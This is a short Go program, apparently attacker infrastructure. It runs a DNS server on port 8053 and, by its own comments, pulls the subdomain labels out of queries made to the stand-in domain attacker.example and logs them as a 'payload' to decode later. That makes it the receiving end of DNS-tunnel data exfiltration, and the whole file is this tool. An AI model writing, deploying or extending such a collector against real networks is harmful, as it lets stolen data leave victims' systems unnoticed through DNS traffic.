package main

import (
	"fmt"
	"github.com/miekg/dns"
	"log"
	"slices"
)

func handleA(w dns.ResponseWriter, r *dns.Msg) {
	question := r.Question[0]

	payload := extractPayload(question.Name)
	//logs the dns query, nned to decode data from it later
	log.Printf("Received query for: %#v\n", payload)

	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	//returns an empty answer for now
	w.WriteMsg(m)
}

func extractPayload(name string) []string {
	domains := dns.SplitDomainName(name)

	if len(domains) < 2 {
		return []string{}
	}

	//Checks if domain belogs to the attacker
	if !slices.Equal(domains[len(domains)-2:], []string{"attacker", "example"}) {
		return []string{}
	}

	payload := domains[:len(domains)-2]

	return payload
}

func main() {
	dns.HandleFunc(".", handleA)
	server := &dns.Server{Addr: ":8053", Net: "udp"}
	fmt.Println("DNS server running on :8053")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
